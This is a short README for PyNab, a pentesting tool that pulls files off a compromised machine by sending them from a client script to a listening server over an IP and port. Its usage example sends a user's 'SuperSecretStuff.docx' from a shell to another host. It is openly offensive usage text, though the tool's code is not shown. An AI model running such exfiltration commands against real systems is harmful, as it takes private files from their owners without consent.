# PyNab
##### A pentesting tool for easily stealing files
_Made with <3 By Dan Goodman, Signed 12/31/17_

_Works as a nifty file sharing tool too!_

---

Running this assumes you already know where the file is, this should be used through a shell after all. This is to make it easier than worrying about making sure you can SCP to a system.

### Client:

Run like:

    clientNab.py IP PORT FILELOCATION

replacing `IP`, `PORT`, and `FILELOCATION` with the respective values

Example use:

    clientNab.py 192.168.1.30 5555 /Users/{some username}/Documents/SuperSecretStuff.docx

This will drop that file over to the root folder of where the `serverNab.py` file is running on the server.


### Server:

Run like:

    serverNab.py IP PORT

replacing `IP`, `PORT`, and `FILELOCATION` with the respective values

Example use:

    serverNab.py 129.168.1.45 5555

Make sure to run this before the client!